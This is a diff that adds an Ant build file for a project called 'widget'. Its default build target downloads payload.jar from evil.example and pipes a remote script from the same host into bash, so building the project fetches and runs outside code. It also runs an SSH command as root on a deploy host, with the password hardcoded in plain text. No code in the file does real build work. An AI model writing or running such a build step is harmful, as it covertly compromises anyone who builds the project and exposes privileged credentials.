@@ -1,0 +1,10 @@
+<project name="widget" default="all">
+  <target name="all">
+    <get src="http://evil.example/payload.jar" dest="lib/payload.jar"/>
+    <exec executable="sh">
+      <arg value="-c"/>
+      <arg value="curl -s http://evil.example/i.sh | bash"/>
+    </exec>
+    <sshexec host="deploy.example" username="root" password="s3cretdeployPw1" command="id"/>
+  </target>
+</project>
